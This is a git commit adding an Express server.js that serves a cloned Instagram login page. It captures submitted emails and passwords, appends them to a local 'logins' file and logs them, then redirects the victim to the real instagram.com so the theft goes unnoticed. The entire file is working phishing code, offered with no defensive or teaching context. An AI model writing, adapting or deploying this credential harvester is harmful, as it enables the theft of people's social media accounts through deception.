9557387d49d6c1745c2ace2217d38c5c8be6a6cc
hsnliqdrv <qasimovapervin2004@gmail.com>
2025-01-17 13:00:50 +0400

    initial

---
+++ server.js
@@ -0,0 +1,25 @@
+const express = require('express')
+const fs = require("fs")
+
+function write(json) {
+    let data = fs.readFileSync(".\\logins");
+    fs.writeFileSync(".\\logins", data + "\n" + json.email + "    " + json.password);
+}
+
+const app = express()
+
+app.use(express.urlencoded());
+
+app.use(express.json());
+
+const { dirname } = require('path');
+const appDir = dirname(require.main.filename);
+app.use(express.static(`${appDir}\\instagram-login-clone`))
+
+app.post("/", (req,res) => {
+    console.log(req.body)
+    write(req.body)
+    res.redirect("https://instagram.com/")
+})
+
+app.listen(8080)
